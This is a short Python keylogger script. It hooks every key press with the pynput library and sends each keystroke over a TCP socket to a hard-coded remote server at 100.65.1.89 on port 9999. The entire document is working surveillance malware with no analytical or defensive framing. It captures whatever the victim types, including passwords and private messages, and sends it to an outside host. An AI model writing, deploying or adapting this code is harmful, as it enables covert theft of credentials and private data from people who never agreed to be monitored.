import socket
from pynput.keyboard import Listener

# Server Information
server_ip = '100.65.1.89'
server_port = 9999

# Create a TCP socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_ip, server_port))

# Keystroke Count
keystroke_count = 0

# Function to send data to the server
def send_data(data):
    try:
        client_socket.send(data.encode('utf-8'))
    except Exception as e:
        print(f"Error sending data: {e}")

# Callback for each key press
def on_press(key):
    global keystroke_count
    keystroke_count += 1
    
    try:
        # Log and send key information to the server
        key_str = str(key).replace("'", "")
        print(f"Key pressed: {key_str}")
        send_data(key_str)
    except Exception as e:
        print(f"Error logging key: {e}")

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()

# Close the socket after logging
client_socket.close()
